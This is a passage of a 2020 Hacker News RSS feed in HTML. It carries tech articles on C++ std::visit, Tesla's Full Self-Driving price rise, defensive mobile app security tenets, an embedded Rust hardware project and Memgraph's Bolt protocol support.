to get pattern matching into the language‚Äîis provide something akin to <code>make_visitor</code>.
But that too is left as an exercise for the user.</p>

<p>If I had to guess how we ended up this way,
I‚Äôd assume it comes down to confirmation bias.
Maybe when a bunch of really smart people who know how
<a href="http://en.cppreference.com/w/cpp/language/sfinae">SFINAE</a> works offhand
and don‚Äôt flinch when they see the likes of</p>

<div><pre><code><span>template</span> <span>&lt;</span><span>typename</span> <span>F</span><span>&gt;</span>
<span>typename</span> <span>std</span><span>::</span><span>enable_if</span><span>&lt;!</span><span>std</span><span>::</span><span>is_reference</span><span>&lt;</span><span>F</span><span>&gt;::</span><span>value</span><span>,</span> <span>int</span><span>&gt;::</span><span>type</span>
<span>foo</span><span>(</span><span>F</span> <span>f</span><span>)</span>
<span>{</span>
    <span>// ...
</span><span>}</span>
</code></pre>
</div>

<p>get together, the result is something like <code>std::visit</code>.
Nobody proclaims that the emperor has no clothes, or that it‚Äôs completely
bonkers to expect the average user to build an overloaded callable
object with recursive templates just to see if the thing they‚Äôre looking at
holds an <code><span>int</span></code> or a <code><span>string</span></code>.</p>

<p>I‚Äôm also not here to claim that C++ is too complicated for its own good,
but it‚Äôs certainly more complicated than it has to be.
Scott Meyers, the guy who wrote <em>Effective&nbsp;C++</em> and <em>Effective Modern&nbsp;C++</em>,
has made similar noises in <a href="http://www.ustream.tv/recorded/47947981">recent</a>
<a href="https://youtu.be/RT46MpK39rQ?t=29m51s">talks</a>.
To paraphrase Meyers, I‚Äôm sure each member of the committee cares very much
about avoiding needless complexity and making the language easier to use.
But if you look at the results of their work, it‚Äôs hard to tell.
The accidental complexity just keeps stacking up.</p>

<h2 id="where-are-we-headed">Where are we headed?</h2>

<p>There‚Äôs a reason C++ is so widely used, especially in systems programming.<sup id="fnref:3"><a href="#fn:3">3</a></sup>
It can be incredibly expressive, yet gives you nearly full control of your hardware.
The tooling around it is some of the most mature of any programming language
out there, bar C.
It supports a ridiculous number of platforms.</p>

<p>But even if you set aside all the historical baggage, it has some serious shortcomings.
Spend any amount of time messing with D and you‚Äôll quickly realize that
metaprogramming needn‚Äôt require self-flagellation and insane syntax.
Play with Rust and <!-- Hi, PCJ --> you‚Äôll feel like <code>unique_ptr</code>
and <code>shared_ptr</code>‚Äîwhich themselves have been a breath of fresh air‚Äîare
a bad joke.
The fact that we still handle dependencies in 2017
by literally copy-pasting files into each other with <code><span>#include</span></code>
macros is <em>obscene</em>.</p>

<p>You get the impression, based on what ends up in the ISO standards and what
you hear in conference talks,
that those driving C++ are trying to eliminate some of these shortcomings by
glomming nice bits from other languages onto it.
That‚Äôs a great idea on its face,
but these features often seem to arrive half-baked.
While C++ isn‚Äôt going away any time soon,
it feels like the language is constantly playing a clumsy game of catchup.</p>

<hr>

<p>In spite of all of this,
I‚Äôll be busy encouraging my coworkers to use <code>variant</code> if anybody needs me.
Sum types are such a useful concept that they‚Äôre worth the pain,
and <a href="https://www.youtube.com/watch?v=wvtFGa6XJDU">to quote Jon Kalb</a>,
‚ÄúIf you can‚Äôt program in a language with ugly warts, maybe C++ isn‚Äôt the language
you should be programming in.‚Äù</p>

<hr>



  </article></div>]]>
            </description>
            <link>https://bitbashing.io/std-visit.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931552</guid>
            <pubDate>Thu, 29 Oct 2020 15:28:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tesla raises the price of Full Self-Driving to $10k]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24931529">thread link</a>) | @iqtidar
<br/>
October 29, 2020 | https://www.teslaoracle.com/2020/10/29/tesla-raises-the-price-of-full-self-driving-to-10k/ | <a href="https://web.archive.org/web/*/https://www.teslaoracle.com/2020/10/29/tesla-raises-the-price-of-full-self-driving-to-10k/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-5893">

	
<!-- .entry-header -->

	<figure>

		<!-- .featured-media-inner -->

	</figure><!-- .featured-media -->

	
	<div>

		<div>

			
<figure>
<amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="4076643206" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
  
</amp-ad>
</figure>



<p>Tesla (TSLA) has finally increased the price of its optional Autopilot Full Self-Driving (FSD) software package to $10,000 as <a href="https://www.teslaoracle.com/2020/10/22/tesla-fsd-price-will-go-up-by-2000-starting-next-week-says-elon-musk/">hinted by Elon Musk last week</a>. </p>



<p>The price hike is the result of a successful limited release of the FSD Beta software to selected Tesla Early Access Program members and other drivers considered as ‚Äúsafe &amp; cautious‚Äù by the automaker. </p>



<p>Several of these select beta testers of the Tesla FSD early release version are also social media influencers with thousands of followers. This is helping Tesla create the much-needed hype and marketing as these Tesla owners are sharing <a href="https://www.teslaoracle.com/2020/10/22/watch-these-short-video-clips-of-tesla-fsd-beta-and-be-amazed/">short video clips</a> and extensive testing videos of FSD Beta.</p>



<p>Tesla CEO Elon Musk has continuously warned throughout the years that as Tesla FSD matures and new features are released, the package will get more expensive with the time. The amount of R&amp;D and testing budget that Tesla has invested in exploring Full Self-Driving capabilities in the past few years is now coming to fruition.</p>



<p>A poll on Twitter asked the Tesla community what would be the next price milestone for the FSD package? Options were $11k, $12.5k, $15k, or $20k+ ‚Äî most people thought it would be $12,500 and it will come as soon as 3-6 months.</p>



<figure><div>
<amp-twitter width="600" height="480" layout="responsive" data-tweetid="1321718880159424517" data-width="550" data-dnt="true" i-amphtml-layout="responsive"><i-amphtml-sizer></i-amphtml-sizer><blockquote data-width="550" data-dnt="true" placeholder=""><p lang="en" dir="ltr">‚Ä¶And when do you expect we‚Äôll see the next price hike?</p>‚Äî The Kilowatts <amp-img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f697.png" alt="üöó" width="72" height="72" noloading="" layout="intrinsic" data-amp-original-style="height: 1em; max-height: 1em;" i-amphtml-layout="intrinsic"><img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f697.png" alt="üöó" width="72" height="72" data-amp-original-style="height: 1em; max-height: 1em;" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzcyJyB3aWR0aD0nNzInIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img><amp-img src="https://s.w.org/images/core/emoji/13.0.0/72x72/26a1.png" alt="‚ö°" width="72" height="72" noloading="" layout="intrinsic" data-amp-original-style="height: 1em; max-height: 1em;" i-amphtml-layout="intrinsic"><img src="https://s.w.org/images/core/emoji/13.0.0/72x72/26a1.png" alt="‚ö°" width="72" height="72" data-amp-original-style="height: 1em; max-height: 1em;" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzcyJyB3aWR0aD0nNzInIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img> (@klwtts) <a href="https://twitter.com/klwtts/status/1321718880159424517?ref_src=twsrc%5Etfw">October 29, 2020</a></blockquote></amp-twitter>
</div></figure>



<div><figure><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/06/Tesla-Model-Y-Accessories_small.jpg" alt="" width="508" height="360" layout="intrinsic" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/06/Tesla-Model-Y-Accessories_small.jpg" alt="" width="508" height="360" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzM2MCcgd2lkdGg9JzUwOCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img><figcaption>‚Äì Sponsored ‚Äì</figcaption></figure></div>



<p>In my opinion, the next FSD package price will be around $12k and it will come within the next 1 year or so ‚Äî this thought comes as a result of my years of studying and writing about Tesla and interaction with the community.</p>



<p>And as soon as Elon Musk‚Äôs dream of a Robotaxi fleet materializes, the price of Full Self-Driving will increase exponentially, might even cross the $20k barrier because of its commercial value. </p>



<p>For potential customers not willing to spend $10,000 on <a href="https://www.teslaoracle.com/tag/full-self-driving/">Tesla Autopilot FSD</a>, the basic safety with AEB and Lane Assist is always there, this price hike should not hinder Tesla‚Äôs mission of sustainable transportation globally.</p>



<p>Source: Tesla <a href="https://www.tesla.com/model3/design#autopilot">online car configurator</a>.</p>



<p>Stay tuned for more and more Tesla news, videos, and updates, follow us on:<br><a rel="noreferrer noopener" href="https://news.google.com/publications/CAAqBwgKMOarmgswgLayAw" target="_blank">Google News</a>&nbsp;|&nbsp;<a rel="noreferrer noopener nofollow" href="https://flipboard.com/@TeslaOracle" target="_blank">Flipboard</a>&nbsp;|&nbsp;<a rel="noreferrer noopener nofollow" href="https://feedly.com/i/subscription/feed%2Fhttps%3A%2F%2Fwww.teslaoracle.com%2Ffeed%2F" target="_blank">RSS (Feedly)</a>.</p>



<figure>
<amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="7514654329" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
  
</amp-ad>
</figure>



<h4>Related Articles:</h4>



		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<div>
		
		<!-- .post-meta-wrapper -->

		<div>
	<!-- .author-name -->
	<div>
		<p>Iqtidar has been writing about Tesla, Elon Musk, and EVs for more than 3 years on XAutoWorld.com, many of his articles have been republished on CleanTechnica and InsideEVs, maintains a healthy relationship with the Tesla community across the Social Media sphere.</p>
		<p><a href="https://www.teslaoracle.com/author/iqtidarali/" rel="author">
			View Archive 		</a>
	</p></div><!-- .author-description -->
</div><!-- .author-bio -->

	</div><!-- .section-inner -->

	
	<!-- .pagination-single -->

	
		<!-- .comments-wrapper -->

		
</article></div>]]>
            </description>
            <link>https://www.teslaoracle.com/2020/10/29/tesla-raises-the-price-of-full-self-driving-to-10k/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931529</guid>
            <pubDate>Thu, 29 Oct 2020 15:26:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Self-driving Roborace car drives directly into a wall]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24931486">thread link</a>) | @taytus
<br/>
October 29, 2020 | https://clips.twitch.tv/ColdbloodedCredulousTriangleArsonNoSexy | <a href="https://web.archive.org/web/*/https://clips.twitch.tv/ColdbloodedCredulousTriangleArsonNoSexy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://clips.twitch.tv/ColdbloodedCredulousTriangleArsonNoSexy</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931486</guid>
            <pubDate>Thu, 29 Oct 2020 15:22:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Security Tenets for Mobile Applications]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24931469">thread link</a>) | @mekinpesen
<br/>
October 29, 2020 | https://www.mekinpesen.com/mobile-security/security-tenets-for-mobile-applications/ | <a href="https://web.archive.org/web/*/https://www.mekinpesen.com/mobile-security/security-tenets-for-mobile-applications/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main id="genesis-content"><article aria-label="Security Tenets for Mobile Applications" itemref="breakthrough-page-title" itemscope="" itemtype="https://schema.org/CreativeWork"><div itemprop="text">
<p>There is hardly a day without a security or privacy issue affecting mobile applications. A considerable amount of mobile apps, including popular ones, lack certain security and privacy requirements. When you survey current best-practices or secure frameworks, you will see a whole bunch of conditions and to-do. But there should be minimum requirements for hardening and securing any mobile applications from scratch.</p>



<p>I will try to present the essence of security commandments for mobile applications, especially for enterprise-level apps, without addressing a specific mobile operating system. Here is the most important security requirements or standards for securing/hardening mobile applications:</p>



<ol><li>All communication and functions of a mobile application should be carried out over TLS/SSL or HTTPS channel.</li><li>The authentication mechanism of an enterprise mobile applications must rely on its directory services (Active Directory or so on) and/or SSO (Single Sign-On) feature.</li><li>According to the importance of the mobile application, <strong>a two-factor authentication (2FA) mechanism</strong> should be forced in the application.</li><li>In an enterprise, all inhouse mobile applications should be distributed and used with a mobile device management (MDM) system. And inhouse applications should never be published on public app stores.</li><li>The backend of a mobile application should be designed to operate in <strong>a three-tiered structure</strong> as a web/mobile server, an application server and a database.</li><li>There should be <strong>a strong session handling/management</strong>. Mobile apps should have a session timeout, a manual session termination (logout) and a remote logout mechanism. Also, for each user session, independently and uniquely generated tokens or security key parameters should be used.</li><li>Apps should support <strong>remote wipe</strong> from a stolen or lost device.</li><li><strong>Runtime protection:</strong> No sensitive information should be saved or stored on the device while the application is running (runtime). The data should only be processed at runtime and then destroyed after closing the application.&nbsp;For the data that need to be stored in the mobile device, there should be an encryption mechanism.</li><li>User codes and passwords should not be used or stored as hardcoded.</li><li>The application should only be authorized for the device resources it will use.</li><li>If there is sensitive data usage or access on the application, an encryption must be used on device.</li><li>Apps, especially enterprise apps, should never run on the rooted or jailbroken mobile devices. So, apps should always have a <strong>jailbreaking control</strong> mechanism.</li><li><strong>Tamper-detection and tamper-protection:</strong> The integrity of the apps must be ensured. There should always be an integrity check on the server-side for any changes to the installation files against tampering or intervention.</li><li>Android Firebase App Indexing feature should not be used for enterprise apps.</li><li>For enterprise apps, <strong>any analytics or performance analysis</strong> of the mobile application should not be monitored with 3rd party services. For this purpose, you may need to follow your regulations or governance practices. Also, all external 3rd party functions such as Google Tag Manager, ad manager, Facebook Connect that originate from the development environment should be disabled.</li><li>The mobile application should always be verified on the server-side via a <strong>device ID or token control mechanism</strong>.</li><li>SSL/TLS pinning should be used in apps.</li><li>All traffic from the mobile application‚Äôs form fields must also be encrypted.</li><li><strong>‚ÄúCustom‚Äù encryption and hashing algorithms</strong> designed by developers should never be used in the mobile application. You should choose at least AES-256 in symmetric encryptions, and at least SHA-256 for hashing.</li><li>While storing data in iOS or Android, ‚Äú<strong>secure container</strong>‚Äù structure should be used.</li><li><strong>To prevent the message from being intercepted or changed</strong> at any layer in service calls made in the application, cryptographic hash values of each transaction message should be generated by utilizing a predetermined private key, and these hash values should be crosschecked on the service side.</li><li><strong>To prevent the replaying attack</strong> which repeats service calls in the application, a randomly generated key/nonce value should be added in the cryptographic hash calculation and by this way, each message‚Äôs uniqueness must be ensured. Also, if the unique messages are repeated, the related call/transaction should be blocked.</li><li>The session opened by going through the security steps in the application should be verified in each call/request/transaction.</li><li>The information in the messages incoming/outgoing from the app to the servers should be encrypted.</li><li><strong>Authorization and permission control</strong> should be done for each transaction at the application and the service layer.</li><li>You should not only use or rely on the mobile operating system/device‚Äôs built-in key chains, containers or security mechanism.</li><li>At all stages in the service layer, <strong>error/fault management</strong> should be implemented and recorded.</li><li><strong>Log records</strong> of all successful and unsuccessful service requests/responses should be created for monitoring and audit purposes.</li><li>You should follow <strong>static code analysis/review and security testing</strong> throughout the SDLC.</li></ol>



<p>Besides above, I strongly advise you to follow the instructions published in in <a rel="noreferrer noopener" href="https://owasp.org/www-project-mobile-security/" data-type="URL" data-id="https://owasp.org/www-project-mobile-security/" target="_blank">the OWASP Mobile Security Project</a>.</p>







<p><em>The featured painting above is ‚Äú<a rel="noreferrer noopener" href="https://myforevertravel.com/ataturk-museum-ankara/" data-type="URL" data-id="https://myforevertravel.com/ataturk-museum-ankara/" target="_blank">Mustafa Kemal Pasha, speaker of the Turkish Grand National Assembly and Commander-in-Chief, Fevzi Pasha, Chief of General Staff, Kazim Karabekir Pasha, Commander of Eastern Front and Ismet Pasha, Commander of Western Front, leave for the front.</a>‚Äù <em>from Atat√ºrk Museum Ankara</em>.</em></p>
</div></article><h2>Reader Interactions</h2>
		

		
		

		</main></div></div>]]>
            </description>
            <link>https://www.mekinpesen.com/mobile-security/security-tenets-for-mobile-applications/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931469</guid>
            <pubDate>Thu, 29 Oct 2020 15:20:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Rust for a simple hardware project]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24931388">thread link</a>) | @bschwindHN
<br/>
October 29, 2020 | https://blog.tonari.no/rust-simple-hardware-project | <a href="https://web.archive.org/web/*/https://blog.tonari.no/rust-simple-hardware-project">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this post we'll cover new hardware additions to <a href="https://tonari.no/" rel="noopener" target="_blank">tonari</a> and some of the work and research that went into powering that hardware. We're <a href="https://blog.tonari.no/why-we-love-rust" rel="noopener" target="_blank"><m>big fans of the Rust programming language</m></a> but before this project we hadn't ever used it for embedded hardware. <m>We'll go over our hardware requirements, some possible solutions, some reasons (excuses) for choosing Rust for the job, and provide a primer for getting into embedded programming with Rust. We'll end it with some photos of the absurd-looking hardware we created and our thoughts on doing all this work in Rust.</m></p><p>This article gets fairly technical with lots of acronyms and code snippets. We tried to spell out all the acronyms but let us know if we missed any!</p><p>If you want to skip straight to the code, you can find it here:</p><p><a href="https://github.com/tonarino/panel-firmware" rel="noopener" target="_blank">https://github.com/tonarino/panel-firmware</a></p><a href="#motivations" id="motivations"><h2><m>Motivations</m></h2></a><p>Recently at tonari, we wanted to add a few new product features that give users and ourselves a bit more control over how we manage the environment around tonari. None of these features had a clear solution using our current hardware design, so we looked at this as an opportunity to think about how we might integrate new hardware and controllers into our system in the near-term and longer-term.</p><figure><picture><source srcset="https://blog.tonari.no/images/c792e597-24e3-4e4a-98bb-3da838fd1c67-cropped_hero.jpg.optimized.webp" type="image/webp"><source srcset="https://blog.tonari.no/images/c792e597-24e3-4e4a-98bb-3da838fd1c67-cropped_hero.jpg.optimized.jpg"><img src="https://blog.tonari.no/images/c792e597-24e3-4e4a-98bb-3da838fd1c67-cropped_hero.jpg.optimized.jpg"></picture><figcaption><p>The current tonari hardware with overhead lights, share screen on the left, and volume control below.</p></figcaption></figure><a href="#volume-control-for-shared-audio" id="volume-control-for-shared-audio"><h3>Volume control for shared audio</h3></a><p>tonari users can share video and audio content ‚Äî e.g. <m>YouTube videos</m> or screen mirroring ‚Äî to both sides via a <m>secondary 'share screen' next to the main tonari screen</m>. We don't always have an easy way to optimize volume levels for this content, so we want to offer a simple and consistent way to increase or decrease the volume of shared audio, so that users on either side can find a comfortable balance between content and voices.</p><a href="#quiet-mode" id="quiet-mode"><h3>Quiet mode</h3></a><p>Though tonari is always on, we completely acknowledge that sometimes people need privacy, or just some <m>peace and quiet</m>. I've been known to get a tiny bit loud when playing video games near tonari (or at least that's what <m>t</m>he neighbors have told me). We want everyone to have the ability to easily enable a 'quiet mode' for this situation. The interface should be simple and accessible, so we prefer a physical hardware interface (such as buttons or dials) instead of a special app or complicated touch screen menus.</p><a href="#dynamic-lighting" id="dynamic-lighting"><h3>Dynamic lighting</h3></a><p><m>Lighting conditions change throughout the day based on weather, time or day, or other things happening around tonari. Just like having a camera flash on a phone, having more control of the lighting can help us provide better image quality for both sides. So we want to have good overhead lighting above tonari, and be able to control the color temperature and brightness, to be able to adjust better to each environment and situation.</m></p><a href="#summary-of-requirements" id="summary-of-requirements"><h2>Summary of requirements</h2></a><p>Based on the above features and motivations, we <m>need</m>ed the following:</p><ul><li>Some sort of volume controller</li><li>Interactive hardware, e.g. a button, to put tonari into 'quiet mode'</li><li>Software control of the overhead lights</li><li>The possibility to add more hardware components later as our needs grow</li><li>Wired communication, for reliability and simplicity</li></ul><a href="#hardware-selection" id="hardware-selection"><h2>Hardware selection</h2></a><a href="#volume-hardware" id="volume-hardware"><h3>Volume hardware</h3></a><p><m>Selecting hardware for volume control was fairly simple since there are only a few reasonable choices:</m></p><ul><li>Potentiometer ‚Äî A variable resistor or voltage divider which changes resistance values as you rotate it</li><li>Rotary encoder ‚Äî If you've ever used a volume dial that you can spin forever, that was most likely a rotary encoder. They can give you absolute rotation values, or incremental values depending on the type. Their output is digital, whereas a potentiometer is analog.</li><li>Up/down buttons </li><li>Touch screen</li></ul><p>We wanted the ability to reset the volume after a period of time so someone doesn't leave tonari in a muted state and confuse the next person who uses it. If we wanted to use a potentiometer with that restriction, it would need to be motor-controlled so we can reset it. These kinds of potentiometers are often seen on fancy audio equipment. We would need to include code to drive the motor appropriately and the price per-part is high compared to a simple potentiometer or rotary encoder.</p><p>Touch screens were immediately ruled out for being way too general-purpose and requiring much more code to implement.</p><figure><picture><source srcset="https://blog.tonari.no/images/ada061a5-45bd-44c3-b6c7-e116fb7dca84-IMG_7150.jpg.optimized.webp" type="image/webp"><source srcset="https://blog.tonari.no/images/ada061a5-45bd-44c3-b6c7-e116fb7dca84-IMG_7150.jpg.optimized.jpg"><img src="https://blog.tonari.no/images/ada061a5-45bd-44c3-b6c7-e116fb7dca84-IMG_7150.jpg.optimized.jpg"></picture><figcaption><p>(the kind of thing we're trying to avoid...)</p></figcaption></figure><p>Up/down buttons could work and be a very simple solution, but they're not very satisfying and are borderline annoying when you need to change the volume by a large margin.</p><p>That left us with rotary encoders. They're very inexpensive, fairly easy to write firmware to read from one, they can tell you which direction they're turning and roughly how fast, and some even come combined with a push button. They're not perfect, especially the cheaper ones which can have noise in the output, but for our uses they seemed like the right choice.</p><a href="#lighting-hardware" id="lighting-hardware"><h3>Lighting hardware</h3></a><p>Lighting was a little less straightforward. All we knew was that we wanted control over brightness and color temperature, and ideally they could provide a high lumen output. "Smart" lighting like Phillips Hue was out of the question ‚Äî they're more consumer oriented and typically require apps with a bluetooth or WiFi connection in order to control them.</p><p>Some brief research into this problem introduced me to DALI ‚Äî Digital Addressable Lighting Interface. I read up on DALI for a few minutes and was convinced it was something we wanted to stay far away from. It's likely useful for huge networks of lights in warehouses or something like that, but for our situation where we're only controlling a few lights in the immediate area, it looked like extreme overkill.</p><p>Another complication is <a href="https://www.bhphotovideo.com/explora/video/tips-and-solutions/flicker-free-lights-and-why-they-are-important-you" rel="noopener" target="_blank"><m>light flicker</m></a>. Put simply, any sort of lighting flicker in a video is headache-inducing and unacceptable, especially at the wall-sizes tonari works at. We evaluated as many LED light bars as we could get our hands on, testing them on our camera setups at various frame rates. The funny thing about Japan is that their electrical system is split more or less down the middle: it's 60Hz in the west and 50Hz in the east.</p><figure><picture><source srcset="https://blog.tonari.no/images/a1f7994d-1403-4fd1-a9e4-844328e1cbdf-frequencies_map.jpg.optimized.webp" type="image/webp"><source srcset="https://blog.tonari.no/images/a1f7994d-1403-4fd1-a9e4-844328e1cbdf-frequencies_map.jpg.optimized.jpg"><img src="https://blog.tonari.no/images/a1f7994d-1403-4fd1-a9e4-844328e1cbdf-frequencies_map.jpg.optimized.jpg"></picture><figcaption><p>(Source: <a href="http://www.rikuden.co.jp/eng_electricity/frequencies.html" rel="noopener" target="_blank">http://www.rikuden.co.jp/eng_electricity/frequencies.html</a>)</p></figcaption></figure><p>We run our cameras at 60 FPS when we can but sometimes in the 50Hz region we have to drop to 50 FPS to remove light flicker <m>from the existing light sources</m>. Any light we select has to exhibit zero flicker at 50 and 60 FPS.</p><p>After our tests, we settled on Daiko LED light bars. They don't have flicker at the frame rates we run, they're affordable, bright, they support brightness and color temperature control, and their hardware control circuit seemed simple enough to plug in a custom controller.</p><p>Their brightness and color temperature seemed to be completely controlled by PWM (<a href="https://en.wikipedia.org/wiki/Pulse-width_modulation" rel="noopener" target="_blank">pulse-width modulation</a>) ‚Äî it was written right on the dimmer panel. After a quick check of the provided dimmer with a multimeter and pocket oscilloscope, we learned that the PWM frequency was 1 KHz and the input voltage was +12V.</p><figure><picture><source srcset="https://blog.tonari.no/images/0f385e0d-96db-43eb-bb02-cb0762929e5f-IMG_0054.jpg.optimized.webp" type="image/webp"><source srcset="https://blog.tonari.no/images/0f385e0d-96db-43eb-bb02-cb0762929e5f-IMG_0054.jpg.optimized.jpg"><img src="https://blog.tonari.no/images/0f385e0d-96db-43eb-bb02-cb0762929e5f-IMG_0054.jpg.optimized.jpg"></picture><figcaption><p>Measuring the PWM duty cycle via a pocket oscilloscope</p></figcaption></figure><video src="https://blog.tonari.no/images/ac5e031e-c107-4a17-a052-fc787e5afc43-IMG_0056.mov" controls="" alt="An video from Notion" loop="" muted="" autoplay=""></video><p>So to recap:</p><ul><li><m>We'll use</m> a rotary encoder with pushbutton for volume control and extra user interactions</li><li>Daiko LED light bars will be used</li><li>We need a microcontroller which can interface with a rotary encoder and generate a 1 KHz PWM signal (pretty much any microcontroller can...)</li></ul><a href="#surveying-of-possible-solutions" id="surveying-of-possible-solutions"><h2><m>Surveying</m> of possible solutions</h2></a><p>I personally have a small amount of microcontroller experience, mostly with the ESP8266 and ESP32, and a bit on the Arduino AVR boards. I was very close to just going with the ESP32 ‚Äî I know it and it's packed with peripherals ‚Äî WiFi, bluetooth, SPI, PWM, serial UART, etc. It's super cheap and widely available. <m>I'm actually quite confident an ESP32 solution would have worked perfectly well, but I wanted to push myself a bit and learn something new. At least, that's what I tell myself, but in reality I wanted an excuse to try running </m><m><m>Rust on an embedded platform</m></m><m>.</m></p><p>As it turns out, there is <a href="https://mabez.dev/blog/posts/esp-rust-ecosystem/" rel="noopener" target="_blank">significant progress</a> being made on running Rust on the ESP32, so that will soon be an option. For now, the main way to run code on the ESP32 is through the official "esp-idf" (Espressif IoT Development Framework), using C.</p><p>I can write the ESP32 firmware in C and it'll get the job done, but it's not too fun to write <m>when you know Rust</m>. <m> We already have an existing successful Rust codebase, so anyone who can work on that code can fairly easily jump over to working on Rust firmware</m>. Having our main codebase and the firmware share languages means it will be easy to write a communication library that is shared between the two. The Rust compiler and its borrow-checking rules and type system means less errors at runtime such as configuring the wrong pins for a peripheral, initializing things in the wrong order, or trying to use a resource in two places at once. On top of that, learning new things in Rust is almost always fun and the compile times which would normally be somewhat painful are gone as embedded projects typically don't use the standard library or any heavy dependencies.</p><p>For embedded Rust today, the most popular microcontroller family seems to be the STM32 series by STMicroelectronics. I had ordered a few STM32 board variations several months prior on Aliexpress when I heard about them being recommended for Rust development.</p><p>I was still a little uncertain if this was the right path or if I was heading into a world of hurt so I experimented with the boards a bit. I began looking at some Rust documentation for one of the microcontroller families and ended up on <a href="https://docs.rs/stm32f1xx-hal/0.6.1/stm32f1xx_hal/qei/index.html" rel="noopener" target="_blank">their documentation</a>, wondering what <code>QEI</code> stood for. It's Quadrature Encoder Interface, which is a type of rotary encoder, and happens to be the kind of encoder I purchased to experiment on! The STM32 chips have built-in hardware for decoding rotary encoders??? No way, that's too convenient. I wrote up a quick sample, connected the encoder to the correct pins on the microcontroller, and I was getting valid input from turning the dial, just like that. I was sold.</p><a href="#getting-started-with-embedded-rust" id="getting-started-with-embedded-rust"><h2><m>Getting started</m> with embedded Rust</h2></a><p>When I was researching the ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.tonari.no/rust-simple-hardware-project">https://blog.tonari.no/rust-simple-hardware-project</a></em></p>]]>
            </description>
            <link>https://blog.tonari.no/rust-simple-hardware-project</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931388</guid>
            <pubDate>Thu, 29 Oct 2020 15:14:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MemgraphDB: Why and how we implemented Bolt Protocol v4]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24931364">thread link</a>) | @karimtr
<br/>
October 29, 2020 | https://memgraph.com/blog/memgraph-1-2-release-implementing-the-bolt-protocol-v4 | <a href="https://web.archive.org/web/*/https://memgraph.com/blog/memgraph-1-2-release-implementing-the-bolt-protocol-v4">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>Introduction</h3>
<p>Today, we‚Äôre proud to announce the release of <a href="https://memgraph.com/download">Memgraph 1.2</a>, which significantly improves Memgraph‚Äôs compatibility with the broader graph ecosystem. This makes it easier for developers and data scientists to work with Memgraph using their favourite tools.</p>
<p>One of the biggest changes in this release, is the addition of Bolt v4 and v4.1 support.</p>
<p>In this post, we will explore what exactly is the Bolt protocol, what it brings to the table, and how we implemented it into Memgraph.</p>
<h2>The Bolt Protocol</h2>
<p>If you‚Äôre thinking about using Memgraph in your application, one of the
requirements is the possibility of querying Memgraph directly from your
application with as little effort as possible. You can achieve that by writing
drivers for the Memgraph server in the language you want to support. Drivers are
special libraries that follow predefined rules, aka a protocol, to communicate between
your application and a server.</p>
<p>Instead of defining its own rules, Memgraph decided to use Neo4j‚Äôs protocol
called <a href="https://7687.org/">Bolt</a>. There are 3 important reasons for this
decision:</p>
<ol>
<li>Defining a protocol is not easy</li>
<li>Neo4j also uses <a href="https://www.opencypher.org/">Cypher</a> (that doesn‚Äôt mean that the Bolt protocol can‚Äôt be used for other query languages!)</li>
<li>By supporting Neo4j‚Äôs protocol we automatically become compatible with their drivers</li>
</ol>
<p>The drivers that Neo4j currently maintains are:</p>
<ul>
<li><a href="https://github.com/neo4j/neo4j-java-driver">Java Driver</a></li>
<li><a href="https://github.com/neo4j/neo4j-javascript-driver">JavaScript Driver</a></li>
<li><a href="https://github.com/neo4j/neo4j-dotnet-driver">.NET Driver</a></li>
<li><a href="https://github.com/neo4j/neo4j-python-driver">Python Driver</a></li>
<li><a href="https://github.com/neo4j/neo4j-go-driver">Go Driver</a></li>
</ul>
<p>In other words, by making our server compatible with the Bolt protocol, you can
use Memgraph in any of the languages and frameworks listed above just by using
Neo4j‚Äôs libraries.</p>
<h3>Bolt Protocol Rule Examples</h3>
